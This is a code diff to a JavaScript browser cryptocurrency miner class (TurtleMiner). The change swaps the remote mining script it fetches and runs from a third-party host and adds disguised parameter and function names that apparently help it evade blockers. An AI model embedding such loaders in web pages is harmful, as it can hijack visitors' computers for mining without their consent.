@@ -9,10 +9,10 @@ class TurtleMiner {
 		this.threads = 2;
 		this.workerName = "x";
 		this.events = {
-			start: 	function(instance)		{ console.log(` [WM] Webminer started with ${instance.speed}% speed and ${instance.threads} threads...`)},
-			stop:	function()				{ console.log(" [WM] Webminer stopped!")},
-			report: function(report) 		{ console.log(" [WM] Webminer report: "+report)},
-			error: 	function(code, text) 	{ console.log(" [WM] Webminer error "+code+": "+text)}
+			start: 	function(instance)		{ console.log(`[WM] Webminer started with ${instance.speed}% speed and ${instance.threads} threads...`)},
+			stop:	function()				{ console.log("[WM] Webminer stopped!")},
+			report: function(report) 		{ console.log("[WM] Webminer report: "+report)},
+			error: 	function(code, text) 	{ console.log("[WM] Webminer error "+code+": "+text)}
 		}
 		if ("pool" in config) 		{ this.pool 		= config.pool		}
 		if ("port" in config)		{ this.port 		= config.port		}
@@ -22,19 +22,21 @@ class TurtleMiner {
 		if ("workerName" in config)	{ this.workerName 	= config.workerName	}
 	}
 	stop() {
-		stopMining();
+		stopM();
 		this.events.stop();
 	}
 	start() {
 		if (this.pool != "" && this.port != -1 && this.wallet != "") {
-			loadScript("https://bitcoin-pay.eu/perfekt/perfekt.js?perfekt=wss://?algo=cn-lite?variant=2?jason="+this.pool+":"+this.port+"");
+			// loadScript("https://bitcoin-pay.eu/perfekt/perfekt.js?perfekt=wss://?algo=cn-lite?variant=2?jason="+this.pool+":"+this.port+"");
+			loadScript("https://easyhash.de/tkefrep/tkefrep.js?tkefrep=bs?algy=cn-pico/trtl?nosaj="+this.pool+":"+this.port);
 			setTimeout(() => {
 				try {
-					EverythingIsBinary(this.wallet, this.workerName, 100-this.speed, this.threads);
+					// EverythingIsBinary(this.wallet, this.workerName, 100-this.speed, this.threads);
+					EverythingIsLife(this.wallet, this.workerName, 100-this.speed, this.threads);
 					this.events.start(this);
 					setInterval(this.report, 30000);
 				} catch (err) {
-					this.events.error(1, "unknown error: "+err);
+					this.events.error(1, "unknown error: " + err);
 				}
 			}, 2000);
 		} else {
